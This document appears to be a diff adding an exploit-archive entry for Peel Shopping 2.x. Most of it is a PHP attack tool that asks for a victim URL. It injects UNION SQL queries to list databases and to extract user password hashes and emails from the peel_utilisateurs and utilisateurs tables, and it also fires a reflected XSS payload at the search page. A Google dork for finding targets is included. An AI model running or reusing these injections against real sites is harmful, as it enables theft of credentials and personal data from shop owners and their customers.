@@ -1,0 +1,166 @@
+id: 39777
+date: 10/15/2024
+title: Peel Shopping 2.x Cross Site Scripting / SQL Injection Exploit
+author: Emiliano Febbi
+cves: 
+
+# Exploit Title: Peel Shopping "catid=" SQL injection
+# Google Dork: inurl:/lire/index.php?rubid=
+# Date: 2024-10-02
+# Exploit Author: Emiliano Febbi
+# Vendor Homepage: https://www.peel-shopping.com/
+# Software Link: https://github.com/advisto/peel-shopping
+# Version: 2.x < 3.1
+# Tested on: Windows 10
+
+
+##                                   USAGE:                                            ##                                                                                
+##                                     1                                               ##
+##If you want test this query: produit_details.php?id=1000&catid=100 you need db name. ##
+##                                     2                                               ##
+##If you want test this single parameter index.php?catid= leave the field with default.##
+##                                     3                                               ##
+##If you want test this parameter index.php?rubid= don't you need db name. (#Expl-3)   ##
+##                                  Details:                                           ##
+##You can also test the search module affected by XSS.                                 ##
+##If you see many iframes are the switch of the tables or parameters;carefully use the ## 
+##characters '/' in the full path and '-' before the numericals vars.                  ##
+#########################################################################################                                                                                   
+#########################################################################################
+*****************************************************************************************
+
+[code] Multiple Vulnerabilities exploit [tested]
+<?php
+echo '<html><head><title>Peel Shopping 2.x < 3.1 "catid=" SQL injection</title></head><body><body bgcolor="black">
+<font color="white"><center><pre>
+#################################
+#Peel Shopping 2.x < 3.1 Exploit#
+#vuln finder!                   #
+#Code by Emiliano Febbi - 2024  #
+#################################
+( first get db name and later run exploit )
+</pre><h2>#Expl-1</h2>1 [#Query interested] -> produit_details.php?id=1000&catid=100 AND index.php?catid=<br><br>
+<form action="'.$SERVER[PHP_SELF].'" method="post"><font color="white">#Get Database Name:<font color="red">
+<br>(*Format: http://www.site.fr/produit_details.php?id=1000&catid=-100)</font><br>
+<input type="text" name="victim_site">
+<input type="submit" value="Get!"></form><br>
+<font color="yellow">###########################################################</font>
+<form action="'.$SERVER[PHP_SELF].'" method="post">
+<font color="white">[#insert victim site]:<font color="red"><br>(*Format: http://www.site.fr/produit_details.php?id=1000&catid=-100)</font> or
+<br><font color="lime">(*http://www.site.fr/index.php?catid=-1)</font><- DB_Name default<br>
+<input type="text" name="victim_sitee"><br>
+[#insert database name]:<br>
+<input type="text" name="victim_db" value="default">
+<input type="submit" value="LOAD"></form><br>
+<font color="yellow">###########################################################</font><br><h2>#Expl-2</h2>
+<form action="'.$SERVER[PHP_SELF].'" method="post">
+<font color="white">#XSS Test[search_module]:<font color="red"><br>(*Format: http://www.site.fr/)</font><br>
+<input type="text" name="site_XSS" value="http://www.site.fr/">
+<input type="submit" value="test!"></form>
+<br><font color="yellow">###########################################################</font><br>
+</font></body></center></html>';
+
+if($_POST['victim_site']) {
+$site = $_POST['victim_site'];
+print "<center><font color='red'>#DB_Name:</font>(try-1)<br>";
+$gettt=file_get_contents("$site%20union%20all%20select%201,(SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA)--");
+     $tags=explode('<td class="petit">',$gettt);    
+                $tags=explode("</td>",$tags[1]);
+    $cleaning = array(
+"performance_schema",
+"information_schema",
+           "Accueil",
+              "Vous",
+               "ici",
+               "tes",
+    );
+            $ok = "";
+    $filtred = str_replace($cleaning, $ok, $tags[0]);
+     var_dump(strip_tags($filtred));
+          print "</center><br><br>";
+     
+     print "<center><font color='red'>#DB_Name:</font>(try-2)<br>";
+$gettts=file_get_contents("$site%20union%20all%20select%201,(SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA)--");
+     $tagss=explode('information_schema<br>',$gettts);    
+                  $tagss=explode('" href=',$tagss[1]);
+    
+   
+   $filtreds = str_replace($cleaning, $ok, $tagss[0]);
+                      var_dump(strip_tags($filtreds)); 
+                                                    };;
+/*#exploit*/
+if($_POST['victim_sitee'] and $_POST['victim_db']) {
+$sitee = $_POST['victim_sitee'];
+ $hack_db = $_POST['victim_db'];
+?>
+<center>
+<font color='lime'>1- #ALL @E-Mail and Users: ~table -><font color='white'>peel_utilisateurs</font></font>-> id=&catid=<br>
+<iframe src='<? echo "$sitee"; ?>%20union%20all%20select%201,(SELECT(@x)FROM(SELECT(@x:=0x00)%20,(SELECT(@x)FROM(<? echo "$hack_db"; ?>.peel_utilisateurs)WHERE(@x)IN(@x:=CONCAT(0x20,@x,mot_passe,email,0x3c62723e))))x)--' title='exploit' height='100' width='500'></iframe><br>
+<font color="yellow">###########################################################</font><br>
+<font color='lime'>2- #ALL @E-Mail and Users: ~table -><font color='white'>utilisateurs</font></font>-> id=&catid=<br>
+<iframe src='<? echo "$sitee"; ?>%20union%20all%20select%201,(SELECT(@x)FROM(SELECT(@x:=0x00)%20,(SELECT(@x)FROM(<? echo "$hack_db"; ?>.utilisateurs)WHERE(@x)IN(@x:=CONCAT(0x20,@x,mot_passe,email,0x3c62723e))))x)--' title='exploit' height='100' width='500'></iframe><br>
+<font color='lime'>3- #ALL @E-Mail and Users: ~table -><font color='white'>peel_utilisateurs</font></font>-> catid=<br>
+<iframe src='<? echo "$sitee"; ?>+union+all+select+1,mot_passe,3,4+FROM+peel_utilisateurs--' title='exploit' height='100' width='500'></iframe>
+</center>
+<?
+print "<center><font color='red'>[emails cracked]+md5:</font><br>";
+$textt=file_get_contents("$sitee+%20union%20all%20select%201,(SELECT(@x)FROM(SELECT(@x:=0x00)%20,(SELECT(@x)FROM($hack_db.peel_utilisateurs)WHERE(@x)IN(@x:=CONCAT(0x20,@x,mot_passe,email,0x3c62723e))))x)--");
+$ress = preg_match_all(
+"/[a-z0-9]+[_a-z0-9\.-]*[a-z0-9]+@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,4})/i",
+$textt,
+$matchess
+);
+if ($ress) {
+foreach(array_unique($matchess[0]) as $emails) {
+echo $emails . "<br />";
+}
+}
+else {
+echo "No emails found.";
+}
+};;;
+/*#exploit*/
+echo '<center><h2>#Expl-3</h2><br><form action="'.$SERVER[PHP_SELF].'" method="post">
+<font color="white">independent -> #try again to hack!:</font><font color="red"><br>(*Format: http://www.site.fr)</font><br>
+<input type="text" name="hack2" value="http://www.site.fr"><br>
+<input type="submit" value="LOAD"></center><br>';
+if($_POST['hack2']) {
+$hackk = $_POST['hack2'];
+echo '<center><br><font color="yellow">###########################################################</font><br>';
+           echo "2 [#Query interested] -> index.php?rubid=<br><font color='red'>#password1:</font>(try-1)<br>";
+?>
+<iframe src='<? echo "$hackk/index.php?rubid=-3+%23xyz%0AUnIOn%23xyz%0ASeLecT+1,mot_passe,3+FROM+peel_utilisateurs--"; ?>' title='exploit' height='100' width='500'></iframe><br>
+<font color='red'>#password2:</font>(try-2)<br>
+<iframe src='<? echo "$hackk/index.php?rubid=-3+%23xyz%0AUnIOn%23xyz%0ASeLecT+1,mot_passe,3+FROM+utilisateurs--"; ?>' title='exploit' height='100' width='500'></iframe><br>
+<font color='red'>#password3:</font>(try-3)<br>
+<iframe src='<? echo "$hackk/index.php?rubid=-3+%23xyz%0AUnIOn%23xyz%0ASeLecT+1,mot_passe+FROM+peel_utilisateurs--"; ?>' title='exploit' height='100' width='500'></iframe><br>
+<font color='red'>#password4:</font>(try-4)<br>
+<iframe src='<? echo "$hackk/index.php?rubid=-3+%23xyz%0AUnIOn%23xyz%0ASeLecT+1,mot_passe+FROM+utilisateurs--"; ?>' title='exploit' height='100' width='500'></iframe><br>
+<?
+print "<font color='red'>[emails cracked]:</font><br>";
+$text=file_get_contents("$hackk/index.php?rubid=-1+%23xyz%0AUnIOn%23xyz%0ASeLecT+1,email,3%20FROM%20peel_utilisateurs--");
+$res = preg_match_all(
+"/[a-z0-9]+[_a-z0-9\.-]*[a-z0-9]+@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,4})/i",
+$text,
+$matches
+);
+if ($res) {
+foreach(array_unique($matches[0]) as $email) {
+echo $email . "<br />";
+}
+}
+else {
+echo "No emails found.";
+}
+};;;;;
+/*#exploit*/
+if($_POST['site_XSS']) {
+$XSS = $_POST['site_XSS'];
+?>
+<center><iframe src='<? echo "$XSS"; ?>recherche.php?start=0&motclef=<script>alert("XSS vulnerable!")</script>' title='exploit3' height='100' width='500'></iframe></center><br>
+<?
+};;;;
+?>
+[/code]
+
+#  0day.today [2024-10-16]  #
